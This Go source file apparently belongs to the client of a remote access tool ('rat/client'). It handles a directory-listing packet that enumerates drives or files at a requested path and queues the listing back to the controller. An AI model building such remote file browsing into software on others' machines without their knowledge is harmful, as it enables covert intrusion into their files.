package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"oslib"
	"rat/client/drives"
	"rat/shared/network/header"

	"gopkg.in/mgo.v2/bson"
)

type FileData struct {
	Dir  bool
	Name string
	Time string
	Size int64
}

type DirectoryPacket struct {
	Path  string     "path"
	Files []FileData "files"
}

func (packet DirectoryPacket) Header() header.PacketHeader {
	return header.DirectoryHeader
}

func (packet *DirectoryPacket) Init() {
	var files []os.FileInfo
	var err error

	if packet.Path == "" && oslib.Name == oslib.Windows {
		drives.QueryDrives()
		files = drives.Drives
	} else {
		if packet.Path == "" {
			packet.Path = "/"
		}
		files, err = ioutil.ReadDir(packet.Path)
	}

	if err != nil {
		fmt.Println(err.Error())
	}

	for i := 0; i < len(files); i++ {
		file := files[i]

		packet.Files = append(packet.Files, FileData{
			file.IsDir(),
			file.Name(),
			file.ModTime().Format("2006-01-02 15:04:05"),
			file.Size(),
		})
	}
}

func (packet DirectoryPacket) OnReceive() error {
	go func() {
		Queue <- &DirectoryPacket{Path: packet.Path}
	}()
	return nil
}

func (packet DirectoryPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
